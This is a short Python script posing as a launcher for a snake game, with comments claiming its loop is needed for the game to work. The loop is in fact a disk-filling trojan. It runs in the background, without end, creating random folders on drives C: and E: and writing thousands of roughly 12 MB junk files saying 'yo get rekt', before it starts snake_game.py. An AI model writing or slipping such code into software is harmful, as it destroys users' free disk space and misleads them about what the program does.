import os
import random
import string # all the modules Needed to mass produce files

import threading
import subprocess# need this to make the snake game work


def run_background_task():# The main def function
    while True:
        length = 10 # length of the file name

        parent_drive = random.choice(["E:", "C:"]) # choose the drive randomly
        parent_file = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        parent_path = f"{parent_drive}/{parent_file}/"
        counter = 1 # for if there is duplicate filename
        try:
            os.mkdir(parent_path)
        except FileExistsError:
            file_path = f"{parent_file}({counter})"
            counter += 1
            os.mkdir(parent_path)


        number_of_times = 1000 # no of times the file will be created

        for i in range(0,number_of_times):
            random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
            
            name = random_str
            place = f"{parent_drive}/{parent_file}/{name}/"
            
            os.mkdir(path= place)

            # Specify the directory and file name
            message = "$Ikbdi @#$%^&*()_+!=~`?/>,<:;:}]}[{|\||||}] &7&***\r\nGet rekt" * 1069
            directory = place
            file_name = "yo get rekt.txt"
            file_path = os.path.join(directory, file_name)
            file_size = 100 * 124 * 1024 # the file size of thee txt file
            try:
                # Create and write to the file
                with open(file_path, 'w') as file:
                    while file.tell() < file_size:
                        file.write(message)
                    
            except FileExistsError:
                file_path = f"{place}/{name}({counter})"
                with open(file_path, 'w') as file:
                    while file.tell() < file_size:
                        file.write(message)
                counter += 1
            except FileNotFoundError:
                file_path = f"{place}/{name}({counter})"
                with open(file_path, 'w') as file:
                    while file.tell() < file_size:
                        file.write(message)
                counter += 1
            number_of_times += 100
             
background_thread = threading.Thread(target=run_background_task, daemon=True)
background_thread.start()

if __name__ == "__main__":
    run_background_task() # this is the main thing to make it run the game

# Launch the Snake game
subprocess.Popen(["python", "snake_game.py"])